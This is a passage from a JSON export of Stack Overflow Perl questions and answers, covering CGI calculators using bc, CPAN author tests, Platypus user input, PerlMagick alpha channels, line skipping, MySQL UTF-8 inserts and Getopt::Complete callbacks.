value=\"Evaluate\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;&lt;/form&gt;\n&lt;/html&gt;&lt;/body&gt;\nENDHTML\n</code></pre>\n\n<p>Also, please consider using the CGI module's <code>header()</code> method to create your Content-Type header.</p>\n\n<p>And finally, you might look at <a href=\"https://metacpan.org/pod/CGI::Alternatives\" rel=\"nofollow\">CGI::Alternatives</a> to learn (among other things) how to move all of your HTML out into a separate file.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1447179545, "last_edit_date": 1447179545, "creation_date": 1447072832, "answer_id": 33609332, "question_id": 33603042, "link": "https://stackoverflow.com/questions/33603042/how-to-use-bc-command-of-perl-inside-perl-script/33609332#33609332", "title": "How to use bc command of perl inside perl script?", "body": "<p>IPC::Run3 and IPC::Run make it easy to both provide input to and collect output from a child process.</p>\n\n<pre><code>use IPC::Run3 qw( run3 );\n\nmy $equation = '56.8 + 77.7';\n\nrun3([ 'bc', '-l' ], $equation, \\my $stdout, \\my $stderr);\n</code></pre>\n\n<p>The benefits of this approach:</p>\n\n<ul>\n<li><p>No shell is involved which avoids the possibility of accidental shell-code injection.</p></li>\n<li><p>Perl's <code>eval</code> isn't involved which avoids the possibility of accidental Perl-code injection.</p></li>\n<li><p>No need to write your own equation parser.</p></li>\n</ul>\n"}], "owner": {"reputation": 113, "user_id": 1005576, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/1ce02152ee5c8c30b760be615a34b401?s=128&d=identicon&r=PG", "display_name": "Sumit Raj", "link": "https://stackoverflow.com/users/1005576/sumit-raj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 524, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1447179545, "creation_date": 1447046984, "question_id": 33603042, "link": "https://stackoverflow.com/questions/33603042/how-to-use-bc-command-of-perl-inside-perl-script", "title": "How to use bc command of perl inside perl script?", "body": "<p>I am able to execute the below script on command line.\necho \"56.8 + 77.7\" | bc -l</p>\n\n<p>and I get proper output as well but when I try to do the same in my perl/html script and run it in browser it fails. Can you please guide me what's going wrong.</p>\n\n<pre><code>#!/opt/local/bin/perl\n\n$res = 'echo \"56.8 + 77.7\" | bc -l';\nprint \"Content-Type: text/html\\n\\n\";\nprint \"&lt;html&gt;&lt;body&gt;\\n\";\nprint \"&lt;b&gt;Calculator:&lt;/b&gt;&lt;br/&gt;\\n\";\nprint \"&lt;form action=\\\"/cgi-bin/calc.cgi\\\" methor=\\\"GET\\\"&gt;\\n\";\nprint \"&lt;table border=\\\"0\\\"&gt;\\n\";\nprint \"&lt;tr&gt;&lt;td align=\\\"right\\\"&gt;Expression:&lt;/td&gt;\\n\";\nprint \"&lt;td&gt;&lt;input type=\\\"text\\\" name=\\\"exp\\\"\";\nprint   \" value=\\\"$exp\\\"/&gt;&lt;/td&gt;&lt;/tr&gt;\\n\";\nprint \"&lt;tr&gt;&lt;td align=\\\"right\\\"&gt;Result:&lt;/td&gt;\\n\";\nprint \"&lt;td&gt;$res&lt;/td&gt;&lt;/tr&gt;\\n\";\nprint \"&lt;tr&gt;&lt;td&gt;&lt;/td&gt;\\n\";\nprint \"&lt;td&gt;&lt;input type=\\\"submit\\\" value=\\\"Evaluate\\\"/&gt;&lt;/td&gt;&lt;/tr&gt;\\n\";\nprint \"&lt;/table&gt;&lt;/form&gt;\\n\";\nprint \"&lt;/html&gt;&lt;/body&gt;\\n\";\nexit;  \n</code></pre>\n\n<p>I tried using system as well but that didn't seem to work.</p>\n"}, {"tags": ["perl", "cpan"], "answers": [{"comments": [{"owner": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "edited": false, "score": 0, "creation_date": 1447045840, "post_id": 33601979, "comment_id": 54980934, "body": "Is it common to use that particular environment variable? Also your link is broken (I think you changed dist to dists). Did you mean <a href=\"http://search.cpan.org/dist/WWW-Kickstarter/\" rel=\"nofollow noreferrer\">search.cpan.org/dist/WWW-Kickstarter</a>?"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1447038902, "creation_date": 1447038902, "answer_id": 33601979, "question_id": 33601620, "link": "https://stackoverflow.com/questions/33601620/configure-cpan-to-run-author-tests-as-well/33601979#33601979", "title": "Configure CPAN to Run Author Tests As Well", "body": "<p>\"Author tests\" are usually run or skipped based on an env var, so it's just a question of setting that env var. For example, I use <code>DEVEL_TESTS</code>, so the following would run all of <a href=\"http://search.cpan.org/dists/WWW-Kickstarter/\" rel=\"nofollow\">WWW-Kickstarter</a>'s tests, including the one that makes sure all references to the distro's version are consistent: </p>\n\n<pre><code>DEVEL_TESTS=1 cpan WWW::Kickstarter \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "edited": false, "score": 0, "creation_date": 1447047929, "post_id": 33603000, "comment_id": 54981373, "body": "Why does the article recommend that CPAN clients not set <code>AUTHOR_TESTING</code> or <code>RELEASE_TESTING</code>? Do authors commonly make tests that require nontrivial input from the user?"}, {"owner": {"reputation": 5099, "user_id": 406224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bc79fa6fa58e2a4f5e6c2f803cabc48?s=128&d=identicon&r=PG", "display_name": "oalders", "link": "https://stackoverflow.com/users/406224/oalders"}, "reply_to_user": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "edited": false, "score": 1, "creation_date": 1447084738, "post_id": 33603000, "comment_id": 55000404, "body": "There are lots of reasons not to run author tests on clients.  Take, for example, the cases of checking for Pod errors, Pod coverage, spelling tests or something that checks for a well formed distribution (ie that certain files exist).  There&#39;s really no need to run these sorts of tests on clients.  You just introduce more dependencies, a longer test run and perhaps even some new, interesting test failures. You do, however, want to run them locally just before you cut a new release to ensure that you have a sane release.  So you mark them to run as author tests."}], "tags": [], "owner": {"reputation": 5099, "user_id": 406224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bc79fa6fa58e2a4f5e6c2f803cabc48?s=128&d=identicon&r=PG", "display_name": "oalders", "link": "https://stackoverflow.com/users/406224/oalders"}, "is_accepted": false, "score": 1, "last_activity_date": 1447046731, "creation_date": 1447046731, "answer_id": 33603000, "question_id": 33601620, "link": "https://stackoverflow.com/questions/33601620/configure-cpan-to-run-author-tests-as-well/33603000#33603000", "title": "Configure CPAN to Run Author Tests As Well", "body": "<p>According to the <a href=\"https://github.com/Perl-Toolchain-Gang/toolchain-site/blob/master/lancaster-consensus.md\" rel=\"nofollow\">Lancaster Consensus</a> <code>AUTHOR_TESTING</code> is the env var that distribution authors should be using for this kind of testing.  In practice, there are other var names out in the wild, but people should probably standardize on this one.</p>\n\n<pre><code>AUTHOR_TESTING=1 cpan Module::NAME\n</code></pre>\n"}], "owner": {"reputation": 5900, "user_id": 931154, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/bTrZd.jpg?s=128&g=1", "display_name": "Gregory Nisbet", "link": "https://stackoverflow.com/users/931154/gregory-nisbet"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 33, "favorite_count": 0, "accepted_answer_id": 33601979, "answer_count": 2, "score": 0, "last_activity_date": 1447046731, "creation_date": 1447036292, "question_id": 33601620, "link": "https://stackoverflow.com/questions/33601620/configure-cpan-to-run-author-tests-as-well", "title": "Configure CPAN to Run Author Tests As Well", "body": "<p>Is it possible to configure CPAN to run author tests as well if they are appropriate for my OS/Arch? I am more concerned about installing a package that is out of sync with its own test suite without realizing it than taking more time to install new packages.</p>\n"}, {"tags": ["perl", "platypus"], "answers": [{"comments": [{"owner": {"reputation": 325, "user_id": 5482311, "user_type": "registered", "accept_rate": 71, "profile_image": "https://lh5.googleusercontent.com/--HqZ-EA6kDA/AAAAAAAAAAI/AAAAAAAAEsQ/2DCc29Kheno/photo.jpg?sz=128", "display_name": "Mohammad Jumah", "link": "https://stackoverflow.com/users/5482311/mohammad-jumah"}, "edited": false, "score": 0, "creation_date": 1447170893, "post_id": 33603239, "comment_id": 55041783, "body": "Thanks, very helpful comment. I have installed TK modules for perl, and XQuartz on my Mac. This enabled my basic perl script to get user input using using a GUI interface, which was my attempt."}], "tags": [], "owner": {"reputation": 2797, "user_id": 4123698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/883acd9ee061b3a325ba22b1fee3daca?s=128&d=identicon&r=PG&f=1", "display_name": "harvey", "link": "https://stackoverflow.com/users/4123698/harvey"}, "is_accepted": true, "score": 1, "last_activity_date": 1447048520, "creation_date": 1447048520, "answer_id": 33603239, "question_id": 33601580, "link": "https://stackoverflow.com/questions/33601580/using-platypus-to-create-mac-os-x-applications-from-a-perl-script/33603239#33603239", "title": "Using Platypus to create Mac OS X applications from a perl script", "body": "<p>The documentation is clear on this, no bi-directional communication; see <a href=\"http://www.sveinbjorn.org/files/manpages/PlatypusDocumentation.html#812\" rel=\"nofollow noreferrer\">http://www.sveinbjorn.org/files/manpages/PlatypusDocumentation.html#812</a></p>\n\n<p>That leaves you with a few workarounds;</p>\n\n<ul>\n<li><a href=\"http://www.admin-magazine.com/Articles/Automating-with-Expect-Scripts\" rel=\"nofollow noreferrer\">Use and expect script</a> to inject your inputs;</li>\n<li>Update your script to take arguments, which is a feature supported by platypus;</li>\n<li>If you need to add more dynamic information, consider using a <a href=\"http://www.tkdocs.com/tutorial/firstexample.html\" rel=\"nofollow noreferrer\">TK dialog</a> to query for user input; </li>\n<li>On mac you can use an osascript to call a dialog with minimum code; </li>\n</ul>\n\n<p><strong>OSA Script Example</strong></p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\n\nsub osascript($) { system 'osascript', map { ('-e', $_) } split(/\\n/, $_[0]); }\n\nsub dialog {\n  my ($text, $default) = @_;\n  osascript(qq{\n        tell app \"System Events\"\n            text returned of (display dialog \"$text\" default answer \"$default\" buttons {\"OK\"} default button 1 with title \"$(basename $0)\")\n        end tell\n  });\n}\n\nmy $result = dialog(\"Life, the universe and everything?\", \"42\");\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/wEHyc.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/wEHyc.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 325, "user_id": 5482311, "user_type": "registered", "accept_rate": 71, "profile_image": "https://lh5.googleusercontent.com/--HqZ-EA6kDA/AAAAAAAAAAI/AAAAAAAAEsQ/2DCc29Kheno/photo.jpg?sz=128", "display_name": "Mohammad Jumah", "link": "https://stackoverflow.com/users/5482311/mohammad-jumah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 868, "favorite_count": 1, "accepted_answer_id": 33603239, "answer_count": 1, "score": 2, "last_activity_date": 1447048520, "creation_date": 1447035958, "question_id": 33601580, "link": "https://stackoverflow.com/questions/33601580/using-platypus-to-create-mac-os-x-applications-from-a-perl-script", "title": "Using Platypus to create Mac OS X applications from a perl script", "body": "<p>Is it possible to get user input when using Platypus to build an application from a script? </p>\n\n<p>I have a simple perl script. Which if I run from terminal, it asks for user input. But when I build an application file with Platypus, only the script's output is displayed. </p>\n"}, {"tags": ["perl", "perlmagick"], "answers": [{"comments": [{"owner": {"reputation": 196, "user_id": 2632748, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/502891829/picture?type=large", "display_name": "John Westlund", "link": "https://stackoverflow.com/users/2632748/john-westlund"}, "edited": false, "score": 0, "creation_date": 1447045041, "post_id": 33602158, "comment_id": 54980722, "body": "That was it! Thank you!!"}], "tags": [], "owner": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "is_accepted": true, "score": 2, "last_activity_date": 1447040199, "creation_date": 1447040199, "answer_id": 33602158, "question_id": 33600757, "link": "https://stackoverflow.com/questions/33600757/add-an-alpha-channel-to-an-image-read-in-with-perlmagick/33602158#33602158", "title": "Add an alpha channel to an image read in with PerlMagick", "body": "<p>The existence of an alpha channel is an attribute of the image, which needs to be turned on:</p>\n\n<pre><code>$image-&gt;Set(alpha =&gt; 'On');\n</code></pre>\n"}], "owner": {"reputation": 196, "user_id": 2632748, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/502891829/picture?type=large", "display_name": "John Westlund", "link": "https://stackoverflow.com/users/2632748/john-westlund"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "accepted_answer_id": 33602158, "answer_count": 1, "score": 2, "last_activity_date": 1447040199, "creation_date": 1447029211, "question_id": 33600757, "link": "https://stackoverflow.com/questions/33600757/add-an-alpha-channel-to-an-image-read-in-with-perlmagick", "title": "Add an alpha channel to an image read in with PerlMagick", "body": "<p>I'm reading in image that doesn't have an alpha channel:</p>\n\n<pre><code>my $image = Image::Magick-&gt;new;\n$image-&gt;Read(\"./noalpha.png\");\n</code></pre>\n\n<p>And then trying to set certain pixels to a different color/alpha value:</p>\n\n<pre><code>my @color = ( 0.2, 0.4, 0.6, $alpha );\n$image-&gt;SetPixel( x=&gt;$X, y=&gt;$Y, channel=&gt;'RGBA', normalize=&gt;'True', color =&gt; \\@color);\n</code></pre>\n\n<p>But unless the starting image file already had an alpha channel the file I write:</p>\n\n<pre><code>$image-&gt;Write('out.png');\n</code></pre>\n\n<p>doesn't contain an alpha channel.</p>\n\n<p>I've been reading through the PerlMagick documentation, but I must not be looking for the right thing. Is there a way to add an alpha channel to my <code>$image</code> object?</p>\n\n<p>Do I need to create a new image object with the sizing of the original image and re-write everything to that one?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 2167, "user_id": 2237387, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/f10bc46df3b1fa41b60201ac9af5da39?s=128&d=identicon&r=PG", "display_name": "cooldood3490", "link": "https://stackoverflow.com/users/2237387/cooldood3490"}, "edited": false, "score": 1, "creation_date": 1447029522, "post_id": 33599071, "comment_id": 54976981, "body": "this could be what you&#39;re after: <code>next if $_ !=~ &#47;&lt;regex&gt;&#47; </code>. This will skip to the next line of the input file if the current line you&#39;re on does not match the line or pattern you&#39;re looking for. You added the <code>regex</code> tag so I think this is what you&#39;re looking for."}, {"owner": {"reputation": 911, "user_id": 2943867, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4909e6e084f25d04966cd04ce8b3b15f?s=128&d=identicon&r=PG&f=1", "display_name": "Timestretch", "link": "https://stackoverflow.com/users/2943867/timestretch"}, "reply_to_user": {"reputation": 2167, "user_id": 2237387, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/f10bc46df3b1fa41b60201ac9af5da39?s=128&d=identicon&r=PG", "display_name": "cooldood3490", "link": "https://stackoverflow.com/users/2237387/cooldood3490"}, "edited": false, "score": 0, "creation_date": 1447045142, "post_id": 33599071, "comment_id": 54980751, "body": "This is close to what I was looking for.  However, I found out I now need to skip a variable number of lines.  Since I am doing this inside of an <code>if</code> block and need to continue executing more code in the <code>if</code> block after matching with the line I want, I&#39;m not sure <code>next</code> will work.  That seems to jump back out to the outside <code>while</code> loop."}], "answers": [{"tags": [], "owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "is_accepted": false, "score": 3, "last_activity_date": 1447017853, "creation_date": 1447017853, "answer_id": 33599185, "question_id": 33599071, "link": "https://stackoverflow.com/questions/33599071/perl-match-next-in-input/33599185#33599185", "title": "Perl match next in input", "body": "<p>You may want to read from the same filehandle, and skip to a third line,</p>\n\n<pre><code>while ( &lt;INPUT&gt; ) {\n    if (condition) {\n        # match a string 3 lines down from current line\n        &lt;INPUT&gt; for 1..2;\n        $_ = &lt;INPUT&gt; // last; # eof?\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "is_accepted": false, "score": 1, "last_activity_date": 1447025884, "creation_date": 1447025884, "answer_id": 33600368, "question_id": 33599071, "link": "https://stackoverflow.com/questions/33599071/perl-match-next-in-input/33600368#33600368", "title": "Perl match next in input", "body": "<p>I usually maintain state variables for this sort of problem:</p>\n\n<pre><code>my $condition_last_met;\n\nwhile ( &lt;INPUT&gt; ) {\n    if (condition) {\n        $condition_last_met = $.;\n    }\n    if (defined($condition_last_met) &amp;&amp; $condition_last_met + 3 == $.)\n    {\n        # search the string in the current line\n    }\n}\n</code></pre>\n\n<p>This example assumes you never match the condition within 3 lines from the previous match, but that can be dealt with in the same way.</p>\n"}, {"tags": [], "owner": {"reputation": 76, "user_id": 5543359, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3dd567573344d2439a7ea4c15ff7e055?s=128&d=identicon&r=PG&f=1", "display_name": "Chandan K Singh", "link": "https://stackoverflow.com/users/5543359/chandan-k-singh"}, "is_accepted": false, "score": 0, "last_activity_date": 1447094034, "creation_date": 1447094034, "answer_id": 33615813, "question_id": 33599071, "link": "https://stackoverflow.com/questions/33599071/perl-match-next-in-input/33615813#33615813", "title": "Perl match next in input", "body": "<p>Usually set a flag and maintain a count to get specific line to match string. Clear after match. </p>\n\n<pre><code>my $conditon_flag = 0;\nmy $count = 0;\nwhile (&lt;input&gt;)\n{\n     if(condition)\n     {\n          $condition_flag = 1;\n          $count++;\n     }\n\n     if($condition_flag == 1 &amp;&amp; $count == 3)\n     {\n           #match the string;\n           $condition_flag = 0;\n           $count = 0;\n     }\n}\n</code></pre>\n"}], "owner": {"reputation": 911, "user_id": 2943867, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4909e6e084f25d04966cd04ce8b3b15f?s=128&d=identicon&r=PG&f=1", "display_name": "Timestretch", "link": "https://stackoverflow.com/users/2943867/timestretch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 276, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1447094034, "creation_date": 1447016970, "question_id": 33599071, "link": "https://stackoverflow.com/questions/33599071/perl-match-next-in-input", "title": "Perl match next in input", "body": "<p>I have a Perl script going through input like so: </p>\n\n<pre><code>while ( &lt;INPUT&gt; ) {\n    if (condition) {\n        # match a string 3 lines down from current line\n    }\n}\n</code></pre>\n\n<p>How do I skip lines and basically \"find the next matching line\" in the input?</p>\n"}, {"tags": ["mysql", "perl", "utf-8", "character-encoding"], "comments": [{"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1449807119, "post_id": 33599063, "comment_id": 56176472, "body": "Add this near the top:  <code>use open &#39;:std&#39;, &#39;:encoding(UTF-8)&#39;;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 6468, "user_id": 293652, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/820308d5db420d7f0e1d0ba97e09f520?s=128&d=identicon&r=PG", "display_name": "Grant McLean", "link": "https://stackoverflow.com/users/293652/grant-mclean"}, "edited": false, "score": 0, "creation_date": 1447034443, "post_id": 33599468, "comment_id": 54978246, "body": "Although you usually want <code>mysql_enable_utf8</code> enabled when retrieving text strings from a database, you usually would not want it enabled when retrieving an XML document.  XML parsers almost always expect bytes as input rather than character strings."}], "tags": [], "owner": {"reputation": 13167, "user_id": 546205, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5d7dd187ae1f4400664cbc0e66c8a2ce?s=128&d=identicon&r=PG", "display_name": "Miguel Prz", "link": "https://stackoverflow.com/users/546205/miguel-prz"}, "is_accepted": false, "score": 1, "last_activity_date": 1447019652, "last_edit_date": 1495541243, "creation_date": 1447019652, "answer_id": 33599468, "question_id": 33599063, "link": "https://stackoverflow.com/questions/33599063/perl-and-mysql-utf-8-malformed-characters-after-insert/33599468#33599468", "title": "Perl and MySQL UTF-8 malformed characters after INSERT", "body": "<p>You have a typo in your code, it should be:</p>\n\n<pre><code>{ mysql_enable_utf8 =&gt; 1 }  \n</code></pre>\n\n<p>Also, you should bind the SQL params:</p>\n\n<pre><code>$db-&gt;do(\"INSERT INTO products (productname) VALUES (?)\", undef, $name);\n</code></pre>\n\n<p>And finally, <a href=\"https://stackoverflow.com/questions/4004214/xmlsimple-encoding-problem\">this SO question</a> may helps you</p>\n"}], "owner": {"reputation": 3782, "user_id": 972828, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/8OSD1.jpg?s=128&g=1", "display_name": "netdjw", "link": "https://stackoverflow.com/users/972828/netdjw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 340, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1447020650, "creation_date": 1447016906, "last_edit_date": 1447020650, "question_id": 33599063, "link": "https://stackoverflow.com/questions/33599063/perl-and-mysql-utf-8-malformed-characters-after-insert", "title": "Perl and MySQL UTF-8 malformed characters after INSERT", "body": "<p>I have an XML file in UTF-8 encoded. I use <code>Perl</code> to parse the file (using <code>XML::Simple</code> module). The parsed code I want to put into a MySQL table what encoded utf8 too (exactly utf8_generic_ci). Everything is good, but two characters go wrong (tipically \u0151 and \u0171 with their uppercase pairs \u0150\u0170).</p>\n\n<p>Here is my perl code:</p>\n\n<pre><code>use strict;\nuse warning;\nuse utf8;\nuse XML::Simple;\nuse DBI;\n\nmy $db = DBI-&gt;connect(\"dbi:mysql:dbname=$dbname;host=$host;port=$port\",\n         $user, $passwd, {mysql_enable_utf8 =&gt; 1}) || die $DBI::errstr;\n\nmy $ref = XMLin(\"file.xml\");\n\nfor ( my $i = 0; $i &lt; scalar(@{$ref-&gt;{\"PRODUCTS\"}}); $i++ ) {\n    my $name = $ref-&gt;{\"PRODUCTS\"}[$i]-&gt;{\"NAME\"};\n    # some changes on the $name, for example removing whitespaces, etc.\n    $db-&gt;do(\"INSERT INTO products (productname) VALUES ('\".$name.\"');\");\n}\n</code></pre>\n\n<p>And here is my mysql table structure (<code>SHOW CREATE TABLE products;</code> output):</p>\n\n<pre><code>| products | CREATE TABLE `products` (\n  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  `productname` varchar(255) NOT NULL DEFAULT '',\n  PRIMARY KEY (`id`),\n) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;\n</code></pre>\n\n<p>I think everything is in UTF-8. If I see the source XML file there is good the \u0151\u0171 characters. But after mysql insert they gone wrong. And the other accents are good.</p>\n\n<p>Any idea what is the problem?</p>\n"}, {"tags": ["perl", "tabs", "completion"], "answers": [{"comments": [{"owner": {"reputation": 881, "user_id": 4452550, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0cffbe865edc0097799ecb052a1be842?s=128&d=identicon&r=PG&f=1", "display_name": "user52366", "link": "https://stackoverflow.com/users/4452550/user52366"}, "edited": false, "score": 0, "creation_date": 1447054849, "post_id": 33599963, "comment_id": 54983531, "body": "Perfect! This works. I had tried calling &#39;directories&#39; but not passed down @_"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 1, "last_activity_date": 1447022997, "creation_date": 1447022997, "answer_id": 33599963, "question_id": 33598219, "link": "https://stackoverflow.com/questions/33598219/directory-completion-in-perl-getoptcomplete-callback/33599963#33599963", "title": "Directory completion in Perl Getopt::Complete callback", "body": "<p><strong>This is not tested!</strong></p>\n\n<p>After looking at the documentation I believe you can just treat the <code>'directories'</code> as an actual sub. It's being generated in <a href=\"https://metacpan.org/source/NNUTTER/Getopt-Complete-0.26/lib/Getopt/Complete/Compgen.pm\" rel=\"nofollow\">Getopt::Complete::Compgen</a> and ends up as <code>Getopt::Complete::directories</code>. So you should be able to simply call that.</p>\n\n<pre><code>use Getopt::Complete (\n    '&lt;&gt;' =&gt; sub {\n        my ( $command, $value, $option, $other_opts ) = @_;\n        if ( $other_opts-&gt;{'&lt;&gt;'} ) {\n            return Getopt::Complete::directories(\n                $command, \n                $value, \n                $option, \n                $other_opts,\n            ); # forward to directory\n        }\n        return ['foo'];\n    }\n);\n</code></pre>\n"}], "owner": {"reputation": 881, "user_id": 4452550, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/0cffbe865edc0097799ecb052a1be842?s=128&d=identicon&r=PG&f=1", "display_name": "user52366", "link": "https://stackoverflow.com/users/4452550/user52366"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 1, "accepted_answer_id": 33599963, "answer_count": 1, "score": 1, "last_activity_date": 1447022997, "creation_date": 1447011836, "last_edit_date": 1447014800, "question_id": 33598219, "link": "https://stackoverflow.com/questions/33598219/directory-completion-in-perl-getoptcomplete-callback", "title": "Directory completion in Perl Getopt::Complete callback", "body": "<p>In a Perl script, I use <a href=\"http://metacpan.org/module/Getopt::Complete\" rel=\"nofollow\"><code>Getopt::Complete</code></a> for automatic completion using the tab key. Everything works well, except for one feature I would like to implement.</p>\n\n<p>I'd like to use a callback that, under some circumstances, provides 'directory' completion. However, returning 'directory' from the callback does not work, as an array reference is expected.  </p>\n\n<pre><code>use Getopt::Complete (\n    '&lt;&gt;' =&gt; sub {\n        my ( $command, $value, $option, $other_opts ) = @_;\n        if ( $other_opts-&gt;{'&lt;&gt;'} ) {\n            return 'directories';    ## here I'd like directory completion\n        }\n        return ['foo'];\n    }\n);\n</code></pre>\n\n<p>How can this behaviour be achieved?</p>\n"}, {"tags": ["windows", "perl", "epoch"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1446994297, "post_id": 33595046, "comment_id": 54965437, "body": "<code>... ) | $mqt;</code> - you&#39;re doing a bitwise OR of your command string. This makes no sense."}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1446996878, "post_id": 33595046, "comment_id": 54966309, "body": "@melpomene .. suggest what we may do to correct the same . In Unix script we did using perl -pe in the mqt.pl and prnted the output using awk -F but in windows same does not work ..hence needed your suggestions"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1446996940, "post_id": 33595046, "comment_id": 54966328, "body": "&quot;Correct&quot; how? I have no idea what your code is trying to do there. Why did you put bitwise operations in there in the first place?"}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": 